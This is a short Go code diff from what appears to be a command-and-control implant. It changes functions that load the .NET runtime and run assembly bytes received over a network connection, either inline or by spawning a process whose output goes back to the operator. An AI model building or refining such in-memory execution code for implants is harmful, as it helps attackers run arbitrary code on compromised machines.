@@ -13,7 +13,6 @@ import (
 
 	"fmt"
 	"main/MessagePack"
-	"main/PcInfo"
 	"net"
 	"runtime"
 
@@ -979,7 +978,7 @@ func Assembly(assemblyBytes []byte, Connection net.Conn, arguments string, unmsg
 		InlineAssembly(assemblyBytes, Connection, arguments, unmsgpack)
 	} else {
 		fmt.Println(unmsgpack.ForcePathObject("args").GetAsString())
-		RunCreateProcessWithPipe(unmsgpack.ForcePathObject("Bin").GetAsBytes(), prog, ""+unmsgpack.ForcePathObject("args").GetAsString(), Connection)
+		RunCreateProcessWithPipe(assemblyBytes, prog, "", Connection)
 	}
 }
 
@@ -989,12 +988,8 @@ func InlineAssembly(data []byte, Connection net.Conn, arguments string, unmsgpac
 	if err != nil {
 		SessionLog(err.Error(), Connection, *unmsgpack)
 	}
-	if PcInfo.IsDotNetFour {
-		DotnetVersion = "v4"
-	} else {
-		DotnetVersion = "v2"
-	}
-	runtimeHost, err := clr.LoadCLR(DotnetVersion)
+
+	runtimeHost, err := clr.LoadCLR("v4")
 
 	if err != nil {
 		// log.Fatal(err)
